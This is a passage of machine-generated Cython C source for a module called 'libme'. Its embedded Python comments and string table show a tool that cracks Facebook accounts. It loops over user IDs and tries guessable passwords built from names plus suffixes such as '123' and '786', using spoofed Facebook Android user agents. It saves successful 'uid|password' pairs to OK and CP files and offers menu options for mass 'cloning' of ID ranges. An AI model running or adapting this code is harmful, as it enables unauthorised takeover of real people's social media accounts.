      __Pyx_INCREF(__pyx_v_uid);
      __Pyx_GIVEREF(__pyx_v_uid);
      PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_v_uid);
      __Pyx_INCREF(__pyx_v_pw);
      __Pyx_GIVEREF(__pyx_v_pw);
      PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_v_pw);
      __pyx_t_8 = __Pyx_PyString_Format(__pyx_kp_s_s_s_2, __pyx_t_7); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 1068, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_7)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_7);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_4 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_7, __pyx_t_8) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_8);
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 1068, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      /* "libme.pyx":1069
 * 				self.cp.append("%s|%s"%(uid, pw))
 * 				open("CP/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 * 				break             # <<<<<<<<<<<<<<
 * 			else:
 * 				continue
 */
      goto __pyx_L4_break;

      /* "libme.pyx":1065
 * 				open("OK/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 * 				break
 * 			elif "checkpoint" in ses.cookies.get_dict().keys():             # <<<<<<<<<<<<<<
 * 				print("\r  \033[1;91m ~> %s|%s\033[0;97m        "%(uid, pw))
 * 				self.cp.append("%s|%s"%(uid, pw))
 */
    }

    /* "libme.pyx":1071
 * 				break
 * 			else:
 * 				continue             # <<<<<<<<<<<<<<
 * 		self.loop+=1
 * 	def main_coeg():
 */
    /*else*/ {
      goto __pyx_L3_continue;
    }

    /* "libme.pyx":1044
 * 			"\r  [] %s/%s ~> ok~> %s - cp~> %s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
 * 		); sys.stdout.flush()
 * 		for pw in pwx:             # <<<<<<<<<<<<<<
 * 			kwargs = {}
 * 			pw = pw.lower()
 */
    __pyx_L3_continue:;
  }
  __pyx_L4_break:;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "libme.pyx":1072
 * 			else:
 * 				continue
 * 		self.loop+=1             # <<<<<<<<<<<<<<
 * 	def main_coeg():
 * 		os.system("git pull")
 */
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_loop); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1072, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_4 = __Pyx_PyInt_AddObjC(__pyx_t_1, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 1072, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_loop, __pyx_t_4) < 0) __PYX_ERR(0, 1072, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

  /* "libme.pyx":1027
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__f_james__, uid, pwx)
 * 	def __f_james__(self, uid, pwx):             # <<<<<<<<<<<<<<
 * 		ua = random.choice([
 * 			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_11);
  __Pyx_AddTraceback("libme.James.__f_james__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_ua);
  __Pyx_XDECREF(__pyx_v_host);
  __Pyx_XDECREF(__pyx_v_pw);
  __Pyx_XDECREF(__pyx_v_kwargs);
  __Pyx_XDECREF(__pyx_v_ses);
  __Pyx_XDECREF(__pyx_v_p);
  __Pyx_XDECREF(__pyx_v_b);
  __Pyx_XDECREF(__pyx_v_bl);
  __Pyx_XDECREF(__pyx_v_i);
  __Pyx_XDECREF(__pyx_v_gaaa);
  __Pyx_XDECREF(__pyx_v_kuki);
  __Pyx_XDECREF(__pyx_v_key);
  __Pyx_XDECREF(__pyx_v_value);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "libme.pyx":1073
 * 				continue
 * 		self.loop+=1
 * 	def main_coeg():             # <<<<<<<<<<<<<<
 * 		os.system("git pull")
 * 		os.system("touch login.txt")
 */

/* Python wrapper */
static PyObject *__pyx_pw_5libme_5James_67main_coeg(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_5libme_5James_67main_coeg = {"main_coeg", (PyCFunction)__pyx_pw_5libme_5James_67main_coeg, METH_NOARGS, 0};
static PyObject *__pyx_pw_5libme_5James_67main_coeg(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("main_coeg (wrapper)", 0);
  __pyx_r = __pyx_pf_5libme_5James_66main_coeg(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5libme_5James_66main_coeg(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("main_coeg", 0);

  /* "libme.pyx":1074
 * 		self.loop+=1
 * 	def main_coeg():
 * 		os.system("git pull")             # <<<<<<<<<<<<<<
 * 		os.system("touch login.txt")
 * 		try:os.mkdir("/sdcard/")
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 1074, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_system); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1074, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_2, __pyx_kp_s_git_pull) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_kp_s_git_pull);
  __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1074, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "libme.pyx":1075
 * 	def main_coeg():
 * 		os.system("git pull")
 * 		os.system("touch login.txt")             # <<<<<<<<<<<<<<
 * 		try:os.mkdir("/sdcard/")
 * 		except:pass
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_os); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1075, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_system); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 1075, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_3, __pyx_kp_s_touch_login_txt) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_kp_s_touch_login_txt);
  __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1075, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "libme.pyx":1076
 * 		os.system("git pull")
 * 		os.system("touch login.txt")
 * 		try:os.mkdir("/sdcard/")             # <<<<<<<<<<<<<<
 * 		except:pass
 * 		try:os.mkdir("OK")
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_4, &__pyx_t_5, &__pyx_t_6);
    __Pyx_XGOTREF(__pyx_t_4);
    __Pyx_XGOTREF(__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_6);
    /*try:*/ {
      __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 1076, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_2);
      __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_mkdir); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1076, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_t_2 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
        __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
        if (likely(__pyx_t_2)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
          __Pyx_INCREF(__pyx_t_2);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_3, function);
        }
      }
      __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_2, __pyx_kp_s_sdcard) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_kp_s_sdcard);
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1076, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    }
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;

    /* "libme.pyx":1077
 * 		os.system("touch login.txt")
 * 		try:os.mkdir("/sdcard/")
 * 		except:pass             # <<<<<<<<<<<<<<
 * 		try:os.mkdir("OK")
 * 		except:pass
 */
    /*except:*/ {
      __Pyx_ErrRestore(0,0,0);
      goto __pyx_L4_exception_handled;
    }
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_ExceptionReset(__pyx_t_4, __pyx_t_5, __pyx_t_6);
    __pyx_L8_try_end:;
  }

  /* "libme.pyx":1078
 * 		try:os.mkdir("/sdcard/")
 * 		except:pass
 * 		try:os.mkdir("OK")             # <<<<<<<<<<<<<<
 * 		except:pass
 * try:
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_6, &__pyx_t_5, &__pyx_t_4);
    __Pyx_XGOTREF(__pyx_t_6);
    __Pyx_XGOTREF(__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_4);
    /*try:*/ {
      __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_os); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1078, __pyx_L9_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_mkdir); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 1078, __pyx_L9_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
        __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
        if (likely(__pyx_t_3)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
          __Pyx_INCREF(__pyx_t_3);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_2, function);
        }
      }
      __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_3, __pyx_n_s_OK) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_n_s_OK);
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1078, __pyx_L9_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    }
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    goto __pyx_L14_try_end;
    __pyx_L9_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;

    /* "libme.pyx":1079
 * 		except:pass
 * 		try:os.mkdir("OK")
 * 		except:pass             # <<<<<<<<<<<<<<
 * try:
 * 	James().__request__()
 */
    /*except:*/ {
      __Pyx_ErrRestore(0,0,0);
      goto __pyx_L10_exception_handled;
    }
    __pyx_L10_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_5, __pyx_t_4);
    __pyx_L14_try_end:;
  }

  /* "libme.pyx":1073
 * 				continue
 * 		self.loop+=1
 * 	def main_coeg():             # <<<<<<<<<<<<<<
 * 		os.system("git pull")
 * 		os.system("touch login.txt")
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_AddTraceback("libme.James.main_coeg", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyMethodDef __pyx_methods[] = {
  {0, 0, 0, 0}
};

#if PY_MAJOR_VERSION >= 3
#if CYTHON_PEP489_MULTI_PHASE_INIT
static PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def); /*proto*/
static int __pyx_pymod_exec_libme(PyObject* module); /*proto*/
static PyModuleDef_Slot __pyx_moduledef_slots[] = {
  {Py_mod_create, (void*)__pyx_pymod_create},
  {Py_mod_exec, (void*)__pyx_pymod_exec_libme},
  {0, NULL}
};
#endif

static struct PyModuleDef __pyx_moduledef = {
    PyModuleDef_HEAD_INIT,
    "libme",
    0, /* m_doc */
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    0, /* m_size */
  #else
    -1, /* m_size */
  #endif
    __pyx_methods /* m_methods */,
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    __pyx_moduledef_slots, /* m_slots */
  #else
    NULL, /* m_reload */
  #endif
    NULL, /* m_traverse */
    NULL, /* m_clear */
    NULL /* m_free */
};
#endif
#ifndef CYTHON_SMALL_CODE
#if defined(__clang__)
    #define CYTHON_SMALL_CODE
#elif defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))
    #define CYTHON_SMALL_CODE __attribute__((cold))
#else
    #define CYTHON_SMALL_CODE
#endif
#endif

static __Pyx_StringTabEntry __pyx_string_tab[] = {
  {&__pyx_kp_s_, __pyx_k_, sizeof(__pyx_k_), 0, 0, 1, 0},
  {&__pyx_kp_s_0, __pyx_k_0, sizeof(__pyx_k_0), 0, 0, 1, 0},
  {&__pyx_kp_s_00, __pyx_k_00, sizeof(__pyx_k_00), 0, 0, 1, 0},
  {&__pyx_kp_s_01, __pyx_k_01, sizeof(__pyx_k_01), 0, 0, 1, 0},
  {&__pyx_kp_s_02, __pyx_k_02, sizeof(__pyx_k_02), 0, 0, 1, 0},
  {&__pyx_kp_s_03, __pyx_k_03, sizeof(__pyx_k_03), 0, 0, 1, 0},
  {&__pyx_kp_s_04, __pyx_k_04, sizeof(__pyx_k_04), 0, 0, 1, 0},
  {&__pyx_kp_s_05, __pyx_k_05, sizeof(__pyx_k_05), 0, 0, 1, 0},
  {&__pyx_kp_s_06, __pyx_k_06, sizeof(__pyx_k_06), 0, 0, 1, 0},
  {&__pyx_kp_s_07, __pyx_k_07, sizeof(__pyx_k_07), 0, 0, 1, 0},
  {&__pyx_kp_s_08, __pyx_k_08, sizeof(__pyx_k_08), 0, 0, 1, 0},
  {&__pyx_kp_s_09, __pyx_k_09, sizeof(__pyx_k_09), 0, 0, 1, 0},
  {&__pyx_kp_s_0_32m_Login_Successfully, __pyx_k_0_32m_Login_Successfully, sizeof(__pyx_k_0_32m_Login_Successfully), 0, 0, 1, 0},
  {&__pyx_kp_s_0_91m_Choose_Code_11_12_13_14_1, __pyx_k_0_91m_Choose_Code_11_12_13_14_1, sizeof(__pyx_k_0_91m_Choose_Code_11_12_13_14_1), 0, 0, 1, 0},
  {&__pyx_kp_s_0_91m_Total_id_0_91m_s_0_97m, __pyx_k_0_91m_Total_id_0_91m_s_0_97m, sizeof(__pyx_k_0_91m_Total_id_0_91m_s_0_97m), 0, 0, 1, 0},
  {&__pyx_kp_s_0_91m_s_s_0_97m, __pyx_k_0_91m_s_s_0_97m, sizeof(__pyx_k_0_91m_s_s_0_97m), 0, 0, 1, 0},
  {&__pyx_kp_s_0_92m_Choose_Code_200_201_202_2, __pyx_k_0_92m_Choose_Code_200_201_202_2, sizeof(__pyx_k_0_92m_Choose_Code_200_201_202_2), 0, 0, 1, 0},
  {&__pyx_kp_s_0_92m_Crack_with_password_0_91m, __pyx_k_0_92m_Crack_with_password_0_91m, sizeof(__pyx_k_0_92m_Crack_with_password_0_91m), 0, 0, 1, 0},
  {&__pyx_kp_s_0_92m_Enter_Key, __pyx_k_0_92m_Enter_Key, sizeof(__pyx_k_0_92m_Enter_Key), 0, 0, 1, 0},
  {&__pyx_kp_s_0_92m_Enter_The_Number_Of_Ids, __pyx_k_0_92m_Enter_The_Number_Of_Ids, sizeof(__pyx_k_0_92m_Enter_The_Number_Of_Ids), 0, 0, 1, 0},
  {&__pyx_kp_s_0_92m_For_example_separators_12, __pyx_k_0_92m_For_example_separators_12, sizeof(__pyx_k_0_92m_For_example_separators_12), 0, 0, 1, 0},
  {&__pyx_kp_s_0_92m_Ok_result_saved_in_ok_txt, __pyx_k_0_92m_Ok_result_saved_in_ok_txt, sizeof(__pyx_k_0_92m_Ok_result_saved_in_ok_txt), 0, 0, 1, 0},
  {&__pyx_kp_s_0_92m_s_s_0_97m, __pyx_k_0_92m_s_s_0_97m, sizeof(__pyx_k_0_92m_s_s_0_97m), 0, 0, 1, 0},
  {&__pyx_kp_s_0_97m_1_Clone_only_10000_to_100, __pyx_k_0_97m_1_Clone_only_10000_to_100, sizeof(__pyx_k_0_97m_1_Clone_only_10000_to_100), 0, 0, 1, 0},
  {&__pyx_kp_s_0_97m_1_Try_method_No_1_fast, __pyx_k_0_97m_1_Try_method_No_1_fast, sizeof(__pyx_k_0_97m_1_Try_method_No_1_fast), 0, 0, 1, 0},
  {&__pyx_kp_s_0_97m_Crack_With_Password_0_91m, __pyx_k_0_97m_Crack_With_Password_0_91m, sizeof(__pyx_k_0_97m_Crack_With_Password_0_91m), 0, 0, 1, 0},
  {&__pyx_kp_s_0_97m_Crack_with_password_0_91m, __pyx_k_0_97m_Crack_with_password_0_91m, sizeof(__pyx_k_0_97m_Crack_with_password_0_91m), 0, 0, 1, 0},
  {&__pyx_kp_s_0_97m_Enter_your_file, __pyx_k_0_97m_Enter_your_file, sizeof(__pyx_k_0_97m_Enter_your_file), 0, 0, 1, 0},
  {&__pyx_kp_s_0_97m_For_Example_Separators_12, __pyx_k_0_97m_For_Example_Separators_12, sizeof(__pyx_k_0_97m_For_Example_Separators_12), 0, 0, 1, 0},
  {&__pyx_kp_s_0_97m_For_Example_Separators_44, __pyx_k_0_97m_For_Example_Separators_44, sizeof(__pyx_k_0_97m_For_Example_Separators_44), 0, 0, 1, 0},
  {&__pyx_kp_s_0_97m_For_example_Separators_44, __pyx_k_0_97m_For_example_Separators_44, sizeof(__pyx_k_0_97m_For_example_Separators_44), 0, 0, 1, 0},
  {&__pyx_kp_s_0_97m_For_example_separators_44, __pyx_k_0_97m_For_example_separators_44, sizeof(__pyx_k_0_97m_For_example_separators_44), 0, 0, 1, 0},
  {&__pyx_kp_s_0_97m_Ok_result_saved_in_ok_txt, __pyx_k_0_97m_Ok_result_saved_in_ok_txt, sizeof(__pyx_k_0_97m_Ok_result_saved_in_ok_txt), 0, 0, 1, 0},
  {&__pyx_kp_s_0_97m_Total_id_0_92m_s_0_97m, __pyx_k_0_97m_Total_id_0_92m_s_0_97m, sizeof(__pyx_k_0_97m_Total_id_0_92m_s_0_97m), 0, 0, 1, 0},
  {&__pyx_kp_s_0_97m_Your_Token, __pyx_k_0_97m_Your_Token, sizeof(__pyx_k_0_97m_Your_Token), 0, 0, 1, 0},
  {&__pyx_kp_s_0_97m_s_s_0_97m, __pyx_k_0_97m_s_s_0_97m, sizeof(__pyx_k_0_97m_s_s_0_97m), 0, 0, 1, 0},
  {&__pyx_kp_s_0_Exit_0_97m_0_93mremove_token, __pyx_k_0_Exit_0_97m_0_93mremove_token, sizeof(__pyx_k_0_Exit_0_97m_0_93mremove_token), 0, 0, 1, 0},
  {&__pyx_kp_s_1, __pyx_k_1, sizeof(__pyx_k_1), 0, 0, 1, 0},
  {&__pyx_kp_s_10, __pyx_k_10, sizeof(__pyx_k_10), 0, 0, 1, 0},
  {&__pyx_n_s_1000, __pyx_k_1000, sizeof(__pyx_k_1000), 0, 0, 1, 1},
  {&__pyx_kp_s_10000, __pyx_k_10000, sizeof(__pyx_k_10000), 0, 0, 1, 0},
  {&__pyx_kp_s_100000, __pyx_k_100000, sizeof(__pyx_k_100000), 0, 0, 1, 0},
  {&__pyx_kp_s_1000000, __pyx_k_1000000, sizeof(__pyx_k_1000000), 0, 0, 1, 0},
  {&__pyx_n_s_10000_2, __pyx_k_10000_2, sizeof(__pyx_k_10000_2), 0, 0, 1, 1},
  {&__pyx_n_s_10007, __pyx_k_10007, sizeof(__pyx_k_10007), 0, 0, 1, 1},
  {&__pyx_kp_s_100074, __pyx_k_100074, sizeof(__pyx_k_100074), 0, 0, 1, 0},
  {&__pyx_kp_s_100075, __pyx_k_100075, sizeof(__pyx_k_100075), 0, 0, 1, 0},
  {&__pyx_kp_s_100076, __pyx_k_100076, sizeof(__pyx_k_100076), 0, 0, 1, 0},
  {&__pyx_kp_s_100078, __pyx_k_100078, sizeof(__pyx_k_100078), 0, 0, 1, 0},
  {&__pyx_n_s_100__00, __pyx_k_100__00, sizeof(__pyx_k_100__00), 0, 0, 1, 1},
  {&__pyx_n_s_100__07, __pyx_k_100__07, sizeof(__pyx_k_100__07), 0, 0, 1, 1},
  {&__pyx_kp_s_11, __pyx_k_11, sizeof(__pyx_k_11), 0, 0, 1, 0},
  {&__pyx_kp_s_12, __pyx_k_12, sizeof(__pyx_k_12), 0, 0, 1, 0},
  {&__pyx_kp_s_123, __pyx_k_123, sizeof(__pyx_k_123), 0, 0, 1, 0},
  {&__pyx_kp_s_1234, __pyx_k_1234, sizeof(__pyx_k_1234), 0, 0, 1, 0},
  {&__pyx_kp_s_12345, __pyx_k_12345, sizeof(__pyx_k_12345), 0, 0, 1, 0},
  {&__pyx_kp_s_156, __pyx_k_156, sizeof(__pyx_k_156), 0, 0, 1, 0},
  {&__pyx_kp_s_1_1_92m_2009_Random_Cloning_0_9, __pyx_k_1_1_92m_2009_Random_Cloning_0_9, sizeof(__pyx_k_1_1_92m_2009_Random_Cloning_0_9), 0, 0, 1, 0},
  {&__pyx_kp_s_1_2009_Random_Cloning_0_97m_Mba, __pyx_k_1_2009_Random_Cloning_0_97m_Mba, sizeof(__pyx_k_1_2009_Random_Cloning_0_97m_Mba), 0, 0, 1, 0},
  {&__pyx_kp_s_1_31m_Warning_0_37m_Don_t_Run_T, __pyx_k_1_31m_Warning_0_37m_Don_t_Run_T, sizeof(__pyx_k_1_31m_Warning_0_37m_Don_t_Run_T), 0, 0, 1, 0},
  {&__pyx_kp_s_1_31m_Warning_1_37m_You_Are_Not, __pyx_k_1_31m_Warning_1_37m_You_Are_Not, sizeof(__pyx_k_1_31m_Warning_1_37m_You_Are_Not), 0, 0, 1, 0},
  {&__pyx_kp_s_1_37m_Warning_0_97mYou_Are_Not, __pyx_k_1_37m_Warning_0_97mYou_Are_Not, sizeof(__pyx_k_1_37m_Warning_0_97mYou_Are_Not), 0, 0, 1, 0},
  {&__pyx_kp_s_1_91m_s_s_0_97m, __pyx_k_1_91m_s_s_0_97m, sizeof(__pyx_k_1_91m_s_s_0_97m), 0, 0, 1, 0},
  {&__pyx_kp_s_1_92m_T_Date_s, __pyx_k_1_92m_T_Date_s, sizeof(__pyx_k_1_92m_T_Date_s), 0, 0, 1, 0},
  {&__pyx_kp_s_1_92m_____1_92m_1_92m, __pyx_k_1_92m_____1_92m_1_92m, sizeof(__pyx_k_1_92m_____1_92m_1_92m), 0, 0, 1, 0},
  {&__pyx_kp_s_1_92m_s_s_0_97m, __pyx_k_1_92m_s_s_0_97m, sizeof(__pyx_k_1_92m_s_s_0_97m), 0, 0, 1, 0},
  {&__pyx_kp_s_1_Clone_only_100074_100075_acco, __pyx_k_1_Clone_only_100074_100075_acco, sizeof(__pyx_k_1_Clone_only_100074_100075_acco), 0, 0, 1, 0},
  {&__pyx_kp_s_2, __pyx_k_2, sizeof(__pyx_k_2), 0, 0, 1, 0},
  {&__pyx_kp_s_2010_10000170_10000180_10000190, __pyx_k_2010_10000170_10000180_10000190, sizeof(__pyx_k_2010_10000170_10000180_10000190), 0, 0, 1, 0},
